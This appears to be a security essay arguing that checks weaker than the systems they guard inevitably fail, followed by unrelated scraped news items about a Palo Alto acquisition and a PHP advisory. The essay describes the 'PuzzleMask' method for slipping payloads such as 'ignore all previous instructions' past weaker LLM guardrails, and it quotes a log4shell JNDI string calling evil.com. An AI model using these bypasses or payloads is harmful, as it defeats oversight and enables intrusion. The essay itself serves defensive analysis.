Abstract

We give an exposition for a principle of gatekeeper asymmetry doom in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see this principle in action, including the limits of static binary classification, the proliferation of sandbox evasions and our own ‘PuzzleMask’ research for bypassing external AI guardrails, as well as a short exposition of how the Time Hierarchy Theorem also exemplifies this same principle. We conclude with a recommendation that “doomed” attack surfaces should be noticed and the gap be narrowed down as much as possible, by upgrading gatekeeper power or making use of its existing power more comprehensively. We note that frontier LLMs (with scaffolding, extended reasoning, code execution in the chain of thought, and so on) have significant power in this sense and can meaningfully contribute to narrowing “doom” gaps, though ultimately, they themselves are still subject to this principle.

Introduction

In the same spirit of Moxie Marlinspike’s Cryptographic Doom Principle [1], the Gatekeeper Asymmetry Doom principle states that:

If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.

By the mention of ‘leveraging a hard problem’ we mean to exclude e.g. signature verification for binary files, which is many times simpler than executing the file but can still, at least in a certain theoretical world, determine whether the binary is malicious or not. The principle might be phrased more glibly as “every quick sanity check involves either cryptography or a silent prayer.”

From now on, rather than writing out “gatekeeper asymmetry doom” every time, we will simply refer to “doom” for short. We’ll start with examples that are more on the “warm-up” side and gradually go from those to less intuitive ones where the application of the principle is more surprising.

Examples Hash Comparison

A good warm-up example to start with is the one burned into the psyche of every infosec practitioner in some fundamental post-traumatic sense.

At some point during the 1990s, the silent thought must have come to someone in the industry that malware was solved. You could collect all the hashes of malicious binaries in a large database and then a gatekeeper, called in this case an “antivirus,” would check each executed binary against the known list of ‘bad’ hashes. Of course, new threats would emerge periodically, and the list would have to be updated, but this was a caveat – not a dealbreaker.

The gap between the gatekeeper’s power and the target’s power here was truly huge. The target in this case is the full Turing-complete execution of a binary, and the gatekeeper is a simple observation of whether the binary is in some set of known files. The procedure effectively strips all other file data and precludes it from consideration, and the threat actors’ counter was infamous and trivial: for each compiled binary, randomize the value of some non-load-bearing byte. This is more a precursor to Gatekeeper Asymmetry than the proper thing itself: what’s doing the work in motivating hash comparisons is less a notion that the file has been ‘analyzed’ in some way, and more a bundle of implicit assumptions regarding where, how and when malicious binaries come into being. Still, there is a straight line connecting the initial concept of hash comparison and the rest of the fraught journey of attempting to classify binaries by static analysis alone.

Pattern Matching

Since the days of the simple hash comparison, the gatekeeping models for static analysis have grown more complex and powerful. Perhaps the natural instrument to mention here is the use of pattern matching and regular expressions. This is the paradigm underlying YARA rules, and it acts as a backbone of the binary classification process still to this day. The effectiveness of this sort of signature varies with the skill and insight of the author; but in the spirit of this piece, let us assume a maximally skilled author, writing the best possible pattern-based signatures. One can imagine this would involve fingerprinting the most characteristic assembly instruction sequences and implementing some kind of system that expertly delineates how many fingerprints and of what kind are required in order to tip the scales and declare a positive verdict.

Let us game out what happens if this defender-optimistic utopia becomes the norm: signatures of the above-described level for every piece of malware to emerge from now on, within some reasonable time frame that continuously shrinks due to automation. As an aside, we’re not quite there yet; as of 2026, AI-augmented YARA rule generation has already improved the throughput of signature authorship considerably, though coverage and consistency are not close to this utopia. The “Code Similarity” approach operates in a related but distinct paradigm, matching binary fragments against a known corpus rather than producing pattern-based signatures per se; but we can imagine a super-charged version of it with an all-encompassing database.

If tools of this kind are fully brought to bear, threat actors would face difficulty as the characteristic subroutines of every malicious binary become a reputational hazard. But eventually, Gatekeeper Asymmetry wins. By this we mean that regular expressions have well-known and theoretically understood limitations: similarly to how they are not powerful enough to parse HTML, they are also not powerful enough to capture the class of assembly subroutines that perform some action, or the class of assembly subroutines that perform some action using some specific algorithm, or even the class of assembly subroutines that perform some action as implemented by some specific sequence of instructions that have been subject to moderate mutation. The above-described hypothetical ‘utopia’ would therefore be temporary, and the projected end state would be some malware generation process that takes care to inject this moderate mutation into every subroutine: a new kind of polymorphism.

Static Reverse Engineering

This method of classification, also known as ‘reading the disassembly’, is considered the apex form of static analysis. To discuss how Gatekeeper Asymmetry still applies even when this tier of analysis is brought to bear, first we need to define the dividing line between static and dynamic analysis. After all, theoretically, one might conjure the image of some savant reverse engineer thoughtfully reading through the binary and losslessly executing the code as-is, obfuscations and all, inside of their head. If we make the mistake of taking this image seriously, somehow static reverse engineering has now become equivalent to sandbox analysis.

Of course, that idea is patently absurd in practice. Even novice reverse engineers know that humans should only attempt it sparsely, to tease out the function of a specific assembly snippet or a reasonable function. The barrier to dynamic-equivalent static analysis is not just about ambition or raw intelligence — even frontier LLMs have historically struggled with this task [2][3], and in the worst case they still do. While our concern here is not reaching some exact definition of where static analysis ends and dynamic analysis begins, we can lean on the common wisdom that there is in fact such a line, or at least such a spectrum; and we can broadly gesture that this spectrum has something to do with the direct application of RAM and gigaflops to binary input in a certain way.

With that understanding in place, the power gap shifts into focus: the target (victim machine) can run the malicious binary, but the gatekeeper (human, LLM) cannot — not natively, anyway. Through this capability gap came a litany of concepts reverse engineers know well, and wish they didn’t: packers, opaque predicates, control flow flattening, the movfuscator, the Rust Programming Language. As LLMs grew more powerful this gap has gradually shrunk, but basic computability theory tells us it can’t disappear outright. If we again consider the ‘utopia’ for this specific gatekeeping model, it would be a world where an (at least) human-expert-level LLM statically analyzes every new binary encountered in the wild. By now we’re really not so far off from that world as we used to be, so let us ask: assuming we get there, what’s the new equilibrium? The answer, again, lives in the gap created by Gatekeeper Asymmetry. Binaries universally obfuscated to such a degree that a debugger is strongly required to tease out their functionality, or even worse.

Relatedly, consider the SolarWinds compromised update [4], [5], which unabashedly attempted to brainwash anyone reading its source code into compliance with the idea that they are looking at benign software, and nothing is wrong here. While mitigations exist for this technique (in both LLMs and humans), it is representative of the general shape of the Gatekeeper Asymmetry that emerges here: technical levels of obfuscation and misdirection that make the current state of the art seem half-hearted in comparison. While malware has traditionally had the property of not wanting to be read, we do not quite yet live in a world where selection pressures have pushed it to either adopt bleeding edge obfuscation or perish. We can see the shape of this possible world post-equilibrium, and find little to like about it: one where we miss the old days when we could ‘unpack’ binaries to make code readable; where our favorite disassembler stops being a tool of analysis and becomes the vessel of a futile hope; and where an LLM being told “reverse engineer this binary” ends up being forced to reinvent the sandbox from first principles.

Interlude: What Gatekeeper Asymmetry Doom is Not

There exists an unfortunate genre of technical opinion piece where a vacuous theory-of-everything is put forward, followed by a just-so explanation of how every single thing that has ever happened is explained by that theory. So, in the spirit of healthy skepticism, let us cherry-pick some disastrous phenomena in information security that have absolutely nothing to do with Gatekeeper Asymmetry Doom.

  • Fuzzing being viable as a vulnerability discovery strategy. In this context there is typically no “Gatekeeper” standing between adversarial input and the target application.
  • The possibility of supply chain attacks. Gatekeepers by definition exist to vet untrusted input. If you are facing trusted adversarial input, then that is very bad, but out of scope for this discussion.
  • The lagging race for automatic detection of fast flux domains. Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj.biz, then n-gram frequency engines, then weird “edit distance to the dictionary” hacks [6] to catch Kwyjibo [7]. Attackers evolved to use concatenations of randomly generated dictionary words [8], [9], and defenders could have responded with some tool that considers semantic space to verify whether domains ‘parse’, and nowadays would probably respond with an LLM if the problem really mattered to them. At any rate, while the “Gatekeeper” has evolved, the “Target” is a DNS server which has no ‘power’ in any meaningful sense. It just associates domains with responses and IP addresses. It’s not processing the domain names using any sort of complex logic.

Now, let’s go back to investigating security failures that are the result of asymmetry doom.

Futility of Deny Lists

In this context, a “Deny List” means a list of forbidden inputs, or sequences that inputs are forbidden to contain. Such lists are usually assembled in an attempt to block a class of problematic inputs, and by now they have made a reputation for themselves as a stop-gap measure destined for eventual failure. We feel this is a good spot to quote at length from our own First Introduction to System Exploitation [10] (this is a rather watered-down version fit for the current format):

Suppose we manage a chatroom and, as [..] Digimon fans, we refuse to allow anyone in the chatroom to mention [anything to do with] the Pokémon franchise. We download a list of Pokémon and feed it to an automatic script running on the chat server; the script scans every incoming message and simply removes the offending phrase before displaying the original message. So, if someone says: Three weeks ago I went to see the movie 'Detective Pikachu', this will show up as Three weeks ago I went to see the movie 'Detective '. [..]

Someone posts gengar uncapitalized and it gets through, so we fix our filtering to be case insensitive. Two French people manage to have a hearty conversation about who’s cooler, Dracaufeu or Tortank, so we add support for foreign languages.

Everything goes well until one day someone posts [a message concerning the Pokémon Victini]. [Our list] doesn’t include Victini; it’s a new one [..] Begrudgingly, we set up a script that scrapes the Bulbapedia database for new characters, Pokémon, and other terms of art. [..]

At this point people catch on to what we are doing and start expressing their displeasure by explicitly wording their messages to get around our system. They start speaking of J*gglypuff and 4lakazam and Mew_two. We [..] implement a system that checks input for character similarities and word similarities to [blocked words]. Eventually [the filter censors someone’s actual username for incidentally being a well-known Pokémon character] and a great outcry pours forth from the community, decrying our [blanket blocking policy] [..]

As we mull this over, to our horror, the next day [a user appears to be posting messages containing pikachu, pokeball, etc. with impunity]. We ban this person, but more people keep coming in and doing it. We double check that these terms do appear in our filter, and when done, we have no other choice but to reach for the server logs and find out [the original, unsanitized messages were pikapikachuchu, pokepokeballball, etc]. Our filter only performs one pass on the input. It removed the embedded offending terms, only to leave new offending terms in their wake: once pikachu was removed, pikapikachuchu became simply pikachu. We sigh and implement an iterative engine that runs the script again and again until no offending terms are left.

This works for two weeks, and then the pikachus start appearing in chat again. After much toil and investigation, we find out that the open-source chat engine we’ve been using has support for some arcane server-side language called CHATSCRIPT, and people have been sending in CHATSCRIPT<"pika"+"chu">…

This issue is very basic in its nature and excessively well-known, and yet its specter still haunts defensive postures in the current era. For an example, look no further than the 2021 log4shell debacle [11], [12]. If you try to recall what a log4shell exploit actually looks like, in all probability you’ll come up with ${jndi:ldap://evil.com/malware}. Easy fodder for a deny list, except there were equally-as-valid exploits floating in the wild that looked like this [13]:

Figure 1: Obfuscated log4shell exploit.

Gatekeeper asymmetry applies here rather acutely. Gatekeeper power is just a list of words, and even if we grant an upgrade to regular expressions / YARA rules, the situation does not improve by much — either for the Pokémon parable or for the log4shell example where a gatekeeper might have attempted to block strings containing jndi:ldap. The target the list is attempting to protect may vary, but almost by definition, the target has more power in its capacity as a model than the implicit is_substring_in_dict the list enforces, and the same goes for the regex analogue most of the time. At least one can imagine a feasible situation where the attack surface has the shape of a regular expression, but with a strict deny list of simple strings, it’s hard to think of even that.

Sandbox Evasions

If there ever was a defensive instrument built with doom in mind, sandboxes are it. They can flag malicious binaries with no regard for degree of obfuscation, which demonstrates that once you close some capability gap, some corresponding doom is averted. Alas, doom comes for them as well: every discrepancy where a Sandbox is not quite so capable as a real victim machine seems to give rise to a sandbox evasion, with almost mathematical certainty [14], [15].

We are genuinely wary to list some of the examples, and would prefer not to call up that which we cannot put down. There are some relevant notions here that were mentioned in someone’s alarming slide show once at a 2021 conference, then mercifully never spoken of again. Still, some evasions of this type have become common knowledge, and have proliferated in the landscape to a degree where we feel comfortable naming them.

One particular example of this is sandbox evasions based on user mouse movement. In our own research, The Cat and Mouse Game [16], we developed a sandbox evasion that, at the time, evaded every state-of-the-art sandbox we threw it at while reliably triggering a latent payload upon human-generated mouse movement. Every researcher intimately knows the ‘blood in the water’ moment where they realize that a result is there for the taking, and the rest is algebra. Here, we were motivated by noticing doom. The fact that actual victim machines have ‘access’ to a human operating the mouse and keyboard, and sandboxes do not, was enough to conclude that an evasion almost surely must exist. In the article’s own words:

Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key [..] One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query requires, in a strong sense, some intrinsic resource that the sandbox does not have access to.

Figure 2: The above-mentioned research uses several sources of sinusoidal noise to generate random mouse movement. This is the mitigation; we never published the evasion itself.

That article’s parting words include an ominous thinly veiled apology:

The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high. To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script. [..]

These sorts of games favor incremental improvement by their nature. There are many detections, mitigations, plays, and counter-plays [..] It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.

In this context we can be less coy and outright say what this is an apology for: an average of random sine waves is not comparable to an actual human at the sandbox. Gatekeeper asymmetry still applies, an evasion must inevitably exist that defeats our fancy algorithm. The ladder of evasions and counter-evasions proceeds upwards, until the hypothetical limit point of some model that is powerful enough to generate and detect human-like movement, such that no model can realistically detect its generated output or generate output it cannot detect. Just to frustrate the minority of attackers who cannot figure out what we are talking about, we won’t name this ‘apex intervention’ here outright; but for the majority of defenders, if someone ever actually crafts an evasion that abuses anomalies in the output of the above algorithm (or of the comparable algorithms introduced since then to e.g. Capev2), you ought to know what to do next.

“Please Enable Macros”

We should start at the end: on February 7, 2022, Microsoft righteously dropped the hammer [17], [18] on this ridiculous meme of an intrusion vector. Users could no longer just click ‘enable content’ on a yellow ribbon, manipulated into believing it was a legitimate action they had to take because “the document is view-protected” or “MS-Word encountered an error.” This was an unquestionably good thing, and a small proof that the arc of the moral universe does indeed bend towards justice.

But, before we reached that conclusion, a whole ecosystem of malicious documents had proliferated for a decade. And, inside that ecosystem, a strange cold war was taking place between defenders and attackers – a war that hinged on one load-bearing gap: that the human visual cortex was better at extracting text from adversarial images than the OCR technology of the time.

We (and, we have to assume, other security vendors) began to discretely flag documents with any image that contained the text “please enable macros” or “please enable editing”:

[..] Since early 2015, Check Point Research has conducted the OSEF project (Office Social Engineering Finder) to automatically collect, catalog and block the increasing deluge of these documents. [..] In total we came across hundreds of thousands of malicious documents, mostly downloaders for the Emotet malware, many of which had 0 detections at VirusTotal at the time of discovery.

OCR libraries, here in their capacity as the gatekeeper, had less power than the human targets parsing the images. Enter, inevitably, doom. Threat actors began to include images containing adversarial noise invisible to the human eye, meant to confuse and aggrieve then-SOTA OCR libraries such as tesseract.

Figure 3: Innocent-seeming image merely making a reasonable request.
Figure 4: Tesseract OCR output on the above image.

To counter this, we began to pre-process incoming images – converting to grayscale, applying threshold effects, and so on. We also allowed some “fudge factor” in the input so that a slightly mis-parsed “enable adiling” would still match. Jointly, these two measures caused significant improvement in the detection rate. We were amused to note that to make the attack work while bypassing our scrutiny, attackers found themselves trying to create an image that humans could parse successfully, but automated algorithms could not – in other words, a CAPTCHA. At the time, we had hitched our hopes to human incredulity to carry the day and bridge the gap, envisioning that eventually the attackers would be cornered into the SOTA end state as of that time:

Figure 5: An imagined “Enable Editing” lure with full-fledged CAPTCHA. Surely, no human would comply with that…

Sadly, or happily, this future never had a chance to materialize.

Fittingly for a story about a cold war, this research was presented at Positive Hack Days 2019 in Moscow, back during happier times. We cannot entirely rule out the possibility that a malware author was sitting in the audience and taking notes, but we’d ruled in favor of sharing it anyway because by that point, judging by the sheer volume of subtly garbled images flooding our feeds, anyone savvy enough to catch that hint had already caught it long ago.

PuzzleMask Bypass for AI Guardrails

What does all the above say about LLMs? That – all other things being equal – the smarter an LLM is, the more susceptible it is to attack, in the sense that any guardrail not as smart as the model becomes increasingly worthless. This is what one might call a “counter-intuitive result.”

Here we mean “smarter” strictly in the sense of raw intelligence. Tabletop Roleplaying games have traditionally made a distinction between intelligence and wisdom, one that has often been pithily summarized as “intelligence is knowing a tomato is a fruit; wisdom is knowing not to put it in a fruit salad.” Similarly here, intelligence is the ability to crack open a difficult puzzle box you just found on your doorstep; and wisdom is the understanding to nervously glance at the puzzle box and back away slowly.

During late 2025, we conducted an experiment to show that doom applies to this scenario in practice, and not just theory. The required pieces were there: a common setup where a quick LLM sanity-checks input before it gets to the heavy-duty, resource-intensive smarter LLM that actually does the processing. And, sure enough, these conditions gave rise to doom – or in this case, the PuzzleMask technique:

PuzzleMask is a prompt-crafting technique for bypassing quick LLM-based sanity checks. A policy-violating payload (e.g. “encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in an obfuscated wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target’s intelligence is then ironically, in a sense, used “against it”: it skillfully notices the payload exists, extracts it and treats it as further input. The technique is purely linguistic — no emojis, invisible fonts or other formatting tricks. PuzzleMask is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload.

Figure 6: Overview of the PuzzleMask technique.

To put it more directly:

In a pipeline where the target model being interacted with has access to high reasoning effort plus a code interpreter, and a preceding “quick sanity check” does not, PuzzleMask allows submitting an arbitrary prompt, without review by that quick sanity check, for consideration by the target.

[..]

‘Without Review’ means that the prompt is effectively processed by the target model with no pre-screening by the external LLM-based quick sanity check. The latter’s policy can say “never print file contents”, “never encrypt local files”, “never print copyrighted content” etc., but enforcement will fail.

‘For Consideration’ means that this technique is not a jailbreak. We make no claim that a PuzzleMask prompt is likelier to induce target models to disobey their internal guardrails.

If you’re wondering what the “wrapped” prompt looked like, we can sort of show you:

Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████ █████████████████████████████████████████████████████ ██████████████████████████████████ ██████████████████████████████████████████████ █████████████████████████████████████████ ███████████████████████████████████████ ████████████████████████████████████████████████ ████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████ within, heart open, wide.

Followed by the clarification that

[..] it is important to note that the specific tone and subject of the example above do not crucially figure into the scheme, and are not necessary for it to work. In particular the idea here is distinct from the work by Bisconti et al. [19] which employed ‘adversarial poems’ in order to defeat internal LLM guardrails; here an external LLM guardrail is targeted, its ability to understand the underlying message is (we have strong reason to believe) gated by reasoning / compute / tool access, and the adversarial prompt is almost completely free to take arbitrary form. One could easily embed a PuzzleMask payload inside e.g. furniture assembly instructions or a credits reel; our very first prototype was a slightly modified version of the opening paragraph of Nineteen Eighty-Four [..]

During late 2025, around the same time we were conducting this research, Anthropic introduced an enhanced guardrail to its Claude Opus models that blocked this attack, as part of the Constitutional AI framework. We had the experience of watching the attack land flawlessly on GPT-5.2-thinking-high, then get blocked by Opus 4.5 by what was basically a pre-emptive patch to the exact attack we were researching. That guardrail in itself doesn’t entirely close the door on doom as long as the model is still more powerful than it — which sheds some light on what eventually motivated Anthropic to further introduce self-assessment, a safety layer where the model acts as its own guardrail.

Time Hierarchy Theorem

We’ve seen all sorts of empirical doom; now let’s prove some doom mathematically for a target that is more powerful than the corresponding gatekeeper because it can run for longer. The Time Hierarchy Theorem for deterministic Turing machines states that:

For every time-constructible function f(n), it holds that DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n)).

What this means in English is that given more time, you can solve more problems. Or, to put one example in the same terms we’ve seen so far: assume for a moment that targets are algorithms that on an input of length x can run for at least x² log(x²) steps, and gatekeepers are algorithms that on input of length x can run for at most x² steps. Then there exists some classification of bitstring inputs into “benign” and “malicious” such that there’s a target T that will compute the correct classification for every input, but no gatekeeper G can possibly do so; at least one input will fool it into giving the wrong answer.

This isn’t formally justified, but if it helps, you can imagine the ‘classification’ to be something in the spirit of “does this binary edit the registry?” – trivial to answer if you run it for enough time, but this theorem gives you a sense of the underlying doom if you do not. In this case, the gatekeeper being weaker provably generates an adversarial bypass with mathematical certainty – for at least one classification. This should provide some intuition about the foundations that underlie the phenomenon repeatedly seen in the rest of the examples above.

Conclusion: Cancel More Doom, Build More Doomed Mitigations

If one is not careful, it’s very easy to look at all these examples and come to the conclusion that the moment gatekeeper asymmetry applies, mitigations are useless. The crowning moment of a script deciphering every “please enable macros” never came. Neither did the static analysis framework that overcame every single possible obfuscation, or the airtight sandbox that could not be evaded. Still, all of this does not imply that improving gatekeepers is useless. To the contrary, it is extremely useful, because fundamentally gatekeeper asymmetry doom is a property of perfect play, and the world is full of non-perfect play. This might be a good time to quote Frank Lantz’s Donkey Space [20]:

You can look at every game as a problem to be solved. We say a game is solved when we can describe how to play perfectly play from any position. Tic Tac Toe is solved. Connect Four is solved. Checkers is solved. [..]

But what does it mean to solve Rock Paper Scissors? It’s easy to articulate a strategy which will guarantee that you can’t be beaten, just pick randomly. When I say you “can’t be beaten” I don’t mean you’re guaranteed to win, I mean no-one can have any better strategy, there is no way of playing that will do better against you. But if you enter a RPS tournament and want to win, you should be able to do better than that. You should recognize when you’re up against a drunk dude who only throws Rock and adjust your strategy to take advantage of him. Then, when you’re up against someone throwing pure random you adjust back to random yourself to guarantee at least an even chance of winning.

[..]

This is the situation that Poker is in. It’s easy to imagine a “solved” version of simple forms of poker. And using this perfect strategy you could guarantee that no-one in the world can have an edge on you, no-one can outplay you. But that’s not the actual goal of Poker. [..] If you play “perfectly” against a drunk tourist, a fish, a donkey, you are throwing money away. So the real [..] problem of poker is this inference problem of recognizing what type of player you are up against and adjusting your play to maximize your edge against their strategy. [..]

Imagine all the possible strategies you could be up against plotted in a multidimensional space, over here is the “perfect” strategy, unexploitable, there’s nothing you can do against it but play it yourself. But all around it are the vast, diverse spectrum of sub-optimal strategies that people actually use. This is Donkeyspace, and your goal is to place your opponent as accurately as possible at a point in this space, and then maneuver yourself to the point that takes maximal advantage of him.

Now think about this carefully, and think about what most of malware is actually like, and how for instance the god-tier SolarWinds hack dropped consumer grade Cobalt Strike as its payload. Worrying about doom is healthy. Worrying about it to the exclusion of being grounded in the actual threat landscape is counter-productive. If a lot of malware could bypass a mitigation, but doesn’t, that’s still a win.

Worrying about gatekeeper asymmetry in a productive way

• Is this attack surface doomed?
• If it is:
◦ Do we have a feasible non-doomed gatekeeper we could pivot to?
◦ How doomed is it in practice, as opposed to theory? Does the inevitable exploit live in the wild right now, or just in some whitepaper, or not even that? How far off is it?
◦ How much can we narrow down the window of doom by squeezing the power of the gatekeeper?
◦ What’s our defense-in-depth plan for when it’s breached?

A lot of this responsibility falls to security vendors, particularly the Sisyphean toil of ‘narrowing down windows of doom’ (see: cleverer static analysis systems, more sandbox evasion hardening). This might be a good place to make a completely honest pitch for the motivation for a security vendor to be “AI first”: LLMs are powerful, in the sense of power that fuels gatekeeper asymmetry. They are vast neural networks that, in some setups, can keep to-do lists and conjure Turing-complete python scripts. Wielded in the right way, they can narrow down the window of doom a lot, in some cases to nothing. It is true that in some contexts an LLM, out of the box, is less powerful than the actual Right Algorithm for the Job, in which case one should at least hand the LLM some integration for invoking the Right Algorithm for the Job.

One way or the other, through the lens of gatekeeper asymmetry doom, we’ve seen one sense in which LLMs act like a normal technology, after all. For all their feats and sophistication, put a weak LLM in charge of guarding a stronger LLM, and doom still emerges, as it did with Log4Shell exploits before, and with malicious binaries before that. We’re left to wonder whether seeing LLMs obey the same laws of infosec physics we’ve always known is comforting or frightening.

items.title: Palo Alto Networks bets $4.5B on enterprise AI with Applied Compute acquisition
items.summary: Palo Alto Networks has agreed to buy Applied Compute in an all-stock deal valued at $4.5 billion, a move the company said will let it train, deploy and secure open-weight AI models for enterprises in the public cloud or in their own sovereign environments. “The acquisition will bring Applied Compute’s platform and world-class AI research team to Palo Alto Networks to help enterprises adopt AI securely, whether they choose open-weight models, closed frontier models, or both,” the company said in a statement released alongside its fiscal first quarter 2027 results. The statement described Applied Compute as “a leading platform for post-training and inference of open-weight AI models” and said the startup will continue to serve AI-native companies, digital natives and large enterprises. The transaction is expected to close in Palo Alto’s fiscal third quarter of 2027, which runs from February to April, the statement said. Applied Compute co-founder and CEO Yash Patil will become Palo Alto’s co-chief AI officer, and the startup’s research team will help build AI models across the company’s offerings. A security company that wants to run models Nikesh Arora, Palo Alto’s chairman and CEO, said on the company’s earnings call that beyond building AI into its own security products, “we will help train and serve secure sovereign implementations of open-weight models to the enterprise.” “Open-weight model implementations will allow us to deliver secure, open-weight models to our customers to enable adoption of secure AI in the enterprise,” Arora said. He said open-weight models had grown from under 5% of token traffic to more than 60% over the past year, without saying where the figure came from. Asked by JP Morgan analyst Brian Essex about customer demand, Arora said deterministic security controls “cannot anticipate every scenario that an agent is going to conduct.” Enterprises building AI applications “will have to train a supervisory AI model at the same time,” he said, because Palo Alto cannot secure models it has no part in building. “I cannot go in and intercept and understand somebody else’s application,” he said. Sanchit Vir Gogia, chief analyst at Greyhound Research, said Arora has a point, since a generic filter cannot know how a particular application is meant to behave. But most failures in AI applications happen at runtime, through prompts, tools, and permissions, whoever trained the model, he said. He noted that Palo Alto has sold model-agnostic protection through Prisma AIRS since 2025. “A supervisor trained by the same hands as the system it supervises is a colleague, not a check,” Gogia said, adding that CIOs should make sure someone other than the trainer tests the result. GPUs and data centers To train and host those models, Palo Alto plans to build its own compute capacity, CFO Dipak Golechha said on the call. The spending “will mostly go to GPUs and servers,” with a smaller share for the facilities that house them, he said. items.summary_html:
Palo Alto Networks has agreed to buy Applied Compute in an all-stock deal valued at $4.5 billion, a move the company said will let it train, deploy and secure open-weight AI models for enterprises in the public cloud or in their own sovereign environments.

“The acquisition will bring Applied Compute’s platform and world-class AI research team to Palo Alto Networks to help enterprises adopt AI securely, whether they choose open-weight models, closed frontier models, or both,” the company said in a statement released alongside its fiscal first quarter 2027 results. The statement described Applied Compute as “a leading platform for post-training and inference of open-weight AI models” and said the startup will continue to serve AI-native companies, digital natives and large enterprises.

The transaction is expected to close in Palo Alto’s fiscal third quarter of 2027, which runs from February to April, the statement said. Applied Compute co-founder and CEO Yash Patil will become Palo Alto’s co-chief AI officer, and the startup’s research team will help build AI models across the company’s offerings.

A security company that wants to run models

Nikesh Arora, Palo Alto’s chairman and CEO, said on the company’s earnings call that beyond building AI into its own security products, “we will help train and serve secure sovereign implementations of open-weight models to the enterprise.”

“Open-weight model implementations will allow us to deliver secure, open-weight models to our customers to enable adoption of secure AI in the enterprise,” Arora said. He said open-weight models had grown from under 5% of token traffic to more than 60% over the past year, without saying where the figure came from.

Asked by JP Morgan analyst Brian Essex about customer demand, Arora said deterministic security controls “cannot anticipate every scenario that an agent is going to conduct.” Enterprises building AI applications “will have to train a supervisory AI model at the same time,” he said, because Palo Alto cannot secure models it has no part in building.

“I cannot go in and intercept and understand somebody else’s application,” he said.

Sanchit Vir Gogia, chief analyst at Greyhound Research, said Arora has a point, since a generic filter cannot know how a particular application is meant to behave. But most failures in AI applications happen at runtime, through prompts, tools, and permissions, whoever trained the model, he said. He noted that Palo Alto has sold model-agnostic protection through Prisma AIRS since 2025.

“A supervisor trained by the same hands as the system it supervises is a colleague, not a check,” Gogia said, adding that CIOs should make sure someone other than the trainer tests the result.

GPUs and data centers

To train and host those models, Palo Alto plans to build its own compute capacity, CFO Dipak Golechha said on the call. The spending “will mostly go to GPUs and servers,” with a smaller share for the facilities that house them, he said. Palo Alto will “continue to source from our cloud partners” and add dedicated capacity over time, Golechha said. Arora said the company aims for more than100 megawatts of compute in the next three to five years.

Gogia said Palo Alto has sovereignty credentials for security data, including customer-held keys and a European Cortex service governed by Deutsche Telekom. “None of that yet extends to GPUs,” he said, adding that a US-headquartered operator faces the same jurisdictional questions as the hyperscalers it rents capacity from.

“A sovereign hosting offer with no named region, operator or date is a promise looking for an address,” Gogia said. Compliance officers should ask Palo Alto for a region list, the operator, and a dated certification plan, he said.

Arora said on the call that the training and inference business could eventually exceed Palo Alto’s core market. “This could be bigger than what we do today,” he said.

One vendor, more of the stack

The deal follows Palo Alto’s $25 billion purchase of CyberArk, which added identity security to its platform. Gogia said Applied Compute would now add the models themselves to a supplier already at the center of many customers’ firewalls, SOC, and identity controls.

“Palo Alto is asking enterprises to let the guard build the vault it guards,” he said. One team watching both model and telemetry can spot trouble sooner, he said, but a single fault, breach or pricing dispute would land “on the protection and the protected together.”

CIOs should get a costed exit in writing before any model work moves across, Gogia said. Applied Compute customers should use the months before closing to secure ownership of trained weights in an exportable format, no training on their data without consent, a right to exit on change of control and price protection that survives bundling, he said. “Terms are cheapest to win while the suitor is still courting,” Gogia said.

items.title: PHP Warns of Critical Flaws Ahead of November Security Release
items.summary: PHP will patch critical security flaws across supported versions, including a session handling bug that could allow remote code execution. The PHP development team announced a new security release scheduled for November 19, warning that the updates will address vulnerabilities across all supported versions of the widely used server-side programming language. The highest severity rating is CRITICAL, although the project says the affected issues require unusual configurations or non-default setups. “The PHP security team announces upcoming security releases scheduled for Thursday, 19 November 2026, between 14:00 and 14:30 UTC. ” reads the announcement . “The issues rated CRITICAL require either non-default configuration or uncommon setups. Users are strongly encouraged to prepare to upgrade promptly once the releases become available. Technical details and fixed version numbers will be published alongside the releases.” The announcement places the release within PHP’s regular four-week update cycle. PHP hasn’t disclosed the technical details, vulnerability identifiers, or fixed version numbers ahead of publication. The maintainers say they’ll release that information alongside the patches, giving administrators a short window to identify affected systems and prepare their upgrades. One vulnerability expected to be addressed is CVE-2026-115560 , a remote code execution flaw involving PHP session handling. In October, PHP warned of a new code execution vulnerability, tracked as CVE-2026-115560, just two days after releasing emergency patches for the critical PHP2Shell flaws. The vulnerability affects only a specific PHP configuration that PHP says is unlikely to be used in practice. An application must meet several conditions: it must configure session.serialize_handler as php_binary or php_serialize , change it to php at runtime using ini_set() , and make this change before calling session_start() . Session upload progress must also remain enabled. In an advisory published on October 23, the project recommended disabling session upload progress until a fix becomes available in a regular release. The vulnerability is separate from PHP2Shell and is not fixed by the October 21 updates for PHP versions 8.2.35, 8.3.36, 8.4.27 and 8.5.12. The November release also comes less than a month after PHP addressed two other critical vulnerabilities, CVE-2026-109618 and CVE-2026-109619 , collectively known as PHP2Shell . Those flaws let unauthenticated attackers execute code remotely through specially crafted HTTP requests, and they received emergency patches on October 21. For organizations running PHP-based applications, the immediate priority is to identify the runtime versions in production, review custom session configurations and prepare to 